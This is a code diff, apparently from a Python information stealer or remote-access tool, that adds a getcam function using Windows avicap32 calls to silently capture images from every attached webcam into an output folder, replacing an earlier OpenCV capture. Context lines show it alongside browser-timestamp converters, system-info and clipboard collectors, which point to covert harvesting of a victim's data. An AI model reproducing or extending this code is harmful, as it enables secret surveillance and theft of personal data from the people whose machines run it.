@@ -274,6 +274,31 @@ def converttounix(timestamp):
     unix_time = (timestamp // 1_000_000) - 11644473600
     return unix_time
 
+def getcam(index, path):
+        avicap32 = ctypes.windll.avicap32
+        WS_CHILD = 0x40000000
+        WM_CAP_DRIVER_CONNECT = 0x0400 + 10
+        WM_CAP_DRIVER_DISCONNECT = 0x0402
+        WM_CAP_FILE_SAVEDIB = 0x0400 + 100 + 25
+
+        hcam = avicap32.capCreateCaptureWindowW(
+            ctypes.wintypes.LPWSTR("hi"),
+            WS_CHILD,
+            0, 0, 0, 0,
+            ctypes.windll.user32.GetDesktopWindow(), 0
+        )
+
+        result = False
+
+        if hcam:
+            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
+                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, ctypes.wintypes.LPWSTR(path)):
+                    result = True
+                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
+            ctypes.windll.user32.DestroyWindow(hcam)
+        
+        return result
+
 def converttounixfirefox(timestamp):
     unix_time = timestamp // 1000
     return unix_time
@@ -435,20 +460,11 @@ def systeminfo():
 def get_webcam():
     global webcam_success
     if config.webcam:
-        import cv2
-        cam_ = os.path.join(output, 'System', 'Webcam.png')
-        os.makedirs(os.path.dirname(cam_), exist_ok=True)
-        try:
-            cap = cv2.VideoCapture(0)
-            ret, frame = cap.read()
-            if ret:
-                cv2.imwrite(cam_, frame)
-                webcam_success = 1
-            else:
-                webcam_success = 0
-            cap.release()
-        except:
-            webcam_success = 0
+        index = 0
+        while getcam(index, os.path.join(output, 'System', f'Webcam {index + 1}.bmp')):
+            index += 1
+            webcam_success = 1
+        
 
 def get_clipboard():
     global clipboard_success
